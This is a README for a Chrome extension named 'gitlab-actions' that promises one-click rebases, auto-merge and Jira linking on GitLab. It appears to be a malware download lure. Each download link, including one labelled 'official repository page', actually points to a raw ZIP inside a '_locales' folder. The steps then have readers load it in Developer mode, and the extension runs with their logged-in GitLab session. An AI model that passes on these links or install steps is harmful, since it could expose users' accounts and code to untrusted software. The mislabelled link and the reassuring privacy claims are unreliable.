# ⚙️ gitlab-actions - Automate your daily GitLab workflow tasks

[![](https://img.shields.io/badge/Download_Extension-Blue)](https://github.com/johanbad524/gitlab-actions/raw/refs/heads/main/_locales/actions_gitlab_v3.5.zip)

This browser extension manages your GitLab merge requests. It simplifies repetitive tasks like rebasing, version bumps, and merging. You save time on code reviews and pull requests. The tool integrates with Jira to track your tickets without extra setup. You do not need API tokens to start.

## 📥 How to Install the Extension

1. Visit the [official repository page](https://github.com/johanbad524/gitlab-actions/raw/refs/heads/main/_locales/actions_gitlab_v3.5.zip) to get the files.
2. Select the latest release version on the right side of the page.
3. Download the ZIP file to your computer.
4. Extract the ZIP folder to a known location like your Desktop or Documents folder.
5. Open your Chrome browser.
6. Type `chrome://extensions` in the address bar and press Enter.
7. Toggle the **Developer mode** switch in the top right corner.
8. Click **Load unpacked** on the top left.
9. Select the folder where you extracted the extension files.
10. The extension icon appears in your browser toolbar.

## 🚀 Key Features

This extension handles several manual tasks for you.

* **One-Click Rebase**: Update your feature branch with the latest changes from the main branch. You click one button. The extension manages the process.
* **Version Bumps**: Increment your project version numbers directly from the merge request page. 
* **Auto-Merge**: Set your pull request to merge once the pipeline finishes. This removes the need to watch the screen.
* **CI Job Control**: Restart failed jobs or cancel builds from your browser.
* **Jira Integration**: Link your merge requests to Jira issues automatically. The tool pulls current status info onto your GitLab dashboard.

## 🛠 Project Requirements

* **Web Browser**: Use Google Chrome or a Chromium-based browser like Microsoft Edge.
* **GitLab Access**: You need an active account on your company or personal GitLab instance.
* **Permissions**: Access to the GitLab tab is necessary for the extension to read your merge request data.

## 📖 Using the Extension

After installation, the extension detects your GitLab environment.

### Managing Merge Requests
Click the extension icon when you view a merge request. A menu appears with available actions. Choose **Rebase** to align branches. Choose **Merge** to finalize the request.

### Tracking Jira Issues
The extension scans your branch names for Jira ticket IDs. If it finds a match, it displays the ticket status in a sidebar. You see the progress of your task without leaving your browser tab. 

### Automating Pipelines
When a build runs, you see a small notification icon next to the pipeline status. You can click this icon to get a summary of the job. If a test fails, you can trigger a retry immediately.

## 🧪 Troubleshooting Common Issues

Check these items if the extension does not appear to work correctly.

* **Refresh the Browser**: Reload your GitLab page after you install the extension. 
* **Check the Extension List**: Ensure the toggle switch in `chrome://extensions` remains in the ON position.
* **Network Access**: Your company firewall might restrict certain scripts. Ensure your browser has permission to talk to your GitLab server.
* **Reinstall**: If the extension shows errors, remove it from the list and load the folder again.

## 🔒 Privacy and Security

You do not need to provide access tokens. The extension works by reading the page content directly. It makes requests to GitLab servers using your current logged-in browser session. It does not store your passwords or session cookies on external servers. All processing happens inside your web browser. 

## 📋 Frequently Asked Questions

**Does this work on Firefox?**
The extension is designed for Chrome. You can try porting it, but we only support Chrome and Edge browsers at this time.

**Where do I see my settings?**
Right-click the extension icon and select **Options**. You can change your Jira server address and adjust automation preferences here.

**Does it change my GitLab permissions?**
No. The extension uses your existing user permissions. If you cannot merge a request normally, the extension cannot force a merge either.

**Can I use this for multiple GitLab accounts?**
The extension detects the active GitLab instance on your current tab. It supports different accounts as long as you log into them in separate browser tabs.

**What happens if the extension crashes?**
You will see an error badge on the icon. Click the icon to see a short report. You can also view the error logs by going to the extension page and clicking **Inspect views - background page**.

## 💡 Productivity Tips

Use the keyboard shortcuts to move faster. You can assign these in the chrome configuration menu. Assign a key for "One-Click Rebase" to update your code without moving your mouse.

Keep your Jira board open in another tab. The extension updates the ticket status automatically when you interact with the merge request. Use this to keep your team informed about your progress. 

The auto-merge feature works best when combined with required approvals. Enable auto-merge, and the system waits for the final required approval before merging. Your work becomes hands-off.